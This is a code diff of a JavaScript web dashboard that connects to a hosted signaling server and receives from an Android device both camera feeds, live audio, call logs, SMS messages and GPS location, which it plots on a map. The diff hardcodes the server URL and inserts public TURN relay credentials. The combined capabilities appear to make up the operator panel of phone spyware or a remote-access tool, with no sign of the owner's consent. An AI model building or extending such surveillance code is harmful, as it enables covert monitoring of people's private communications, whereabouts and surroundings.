@@ -1,17 +1,11 @@
-// Dynamic IP detection based on environment
-function getServerURL() {
-  const hostname = window.location.hostname;
+// =======================
+// Signaling Server Config
+// =======================
 
-  // If accessing via localhost or internal IP, use localhost
-  if (hostname === 'localhost' || hostname === '127.0.0.1' || hostname.startsWith('192.168.') || hostname.startsWith('10.') || hostname.startsWith('172.')) {
-    return 'http://localhost:3000';
-  }
+// Directly use your Render URL (no ports, no HTTP)
+const SIGNALING_URL = "https://webrtc-syec.onrender.com";
 
-  // If accessing via external IP, use the same external IP
-  return `http://${hostname}:3000`;
-}
-
-const socket = io(getServerURL(), {
+const socket = io(SIGNALING_URL, {
   reconnection: true,
   reconnectionAttempts: 15,
   reconnectionDelay: 1000,
@@ -19,6 +13,9 @@ const socket = io(getServerURL(), {
   randomizationFactor: 0.5
 });
 
+// ===============
+// DOM References
+// ===============
 const videoFront = document.getElementById('remoteVideoFront');
 const videoBack = document.getElementById('remoteVideoBack');
 const statusDiv = document.getElementById('status');
@@ -27,6 +24,7 @@ const callLogsDiv = document.getElementById('callLogs');
 const smsDiv = document.getElementById('smsMessages');
 const debugLog = document.getElementById('debugLog');
 const retryButton = document.getElementById('retryButton');
+
 let peer;
 let myId;
 let androidClientId;
@@ -36,13 +34,23 @@ let audioTrack = null;
 let frontVideoTrack = null;
 let backVideoTrack = null;
 
+// =============================
+// WebRTC ICE (STUN + TURN) cfg
+// =============================
 const config = {
   iceServers: [
     { urls: 'stun:stun.l.google.com:19302' },
-    { urls: 'turn:numb.viagenie.ca', username: 'your@email.com', credential: 'yourpassword' }
+    {
+      urls: 'turn:openrelay.metered.ca:443',
+      username: 'openrelayproject',
+      credential: 'openrelayproject'
+    }
   ]
 };
 
+// ==================
+// Helper UI Functions
+// ==================
 function updateStatus(message) {
   console.log(message);
   statusDiv.textContent = message;
@@ -107,6 +115,9 @@ function addSmsMessage(sms) {
   logDebug(`Received SMS from ${sms.address}`);
 }
 
+// ============
+// Map Handling
+// ============
 function initMap() {
   map = L.map('mapContainer').setView([0, 0], 13);
   L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
@@ -128,6 +139,9 @@ function updateMap(latitude, longitude) {
   logDebug(`Updated map to lat=${latitude}, lng=${longitude}`);
 }
 
+// =====================
+// Video Stream Handling
+// =====================
 function updateStreams() {
   if (frontVideoTrack) {
     const frontStream = new MediaStream([frontVideoTrack]);
@@ -141,6 +155,7 @@ function updateStreams() {
       });
     };
   }
+
   if (backVideoTrack) {
     const backStream = new MediaStream([backVideoTrack]);
     if (audioTrack) backStream.addTrack(audioTrack);
@@ -153,14 +168,21 @@ function updateStreams() {
       });
     };
   }
+
   updateStatus('Receiving remote streams');
 }
 
+// ==================
+// Socket Reconnect
+// ==================
 function reconnectSocket() {
   updateStatus('Attempting to reconnect to server...');
   socket.connect();
 }
 
+// ==================
+// Socket.IO Handlers
+// ==================
 socket.on('connect', () => {
   updateStatus('Connected to signaling server');
 });
@@ -213,6 +235,9 @@ socket.on('location', data => {
   updateMap(data.latitude, data.longitude);
 });
 
+// =======================
+// WebRTC Signaling Handler
+// =======================
 socket.on('signal', async (data) => {
   logDebug(`Received signal from ${data.from}: ${data.signal.type || 'candidate'}`);
   const { from, signal } = data;
@@ -221,6 +246,8 @@ socket.on('signal', async (data) => {
     logDebug('Creating new peer connection');
     try {
       peer = new RTCPeerConnection(config);
+
+      // Expecting: front video, back video, and audio
       peer.addTransceiver('video', { direction: 'recvonly' });
       peer.addTransceiver('video', { direction: 'recvonly' });
       peer.addTransceiver('audio', { direction: 'recvonly' });
@@ -288,6 +315,9 @@ socket.on('signal', async (data) => {
   }
 });
 
+// ===================
+// Android Disconnect
+// ===================
 socket.on('android-client-disconnected', () => {
   updateStatus('Android client disconnected');
   if (peer) {
@@ -312,8 +342,14 @@ socket.on('error', (error) => {
   updateStatus(`Server error: ${error.message}`);
 });
 
+// ============
+// UI Listeners
+// ============
 retryButton.addEventListener('click', reconnectSocket);
 
+// ============
+// Init
+// ============
 updateStatus('Connecting to server...');
 logDebug('Web client initializing...');
 initMap();
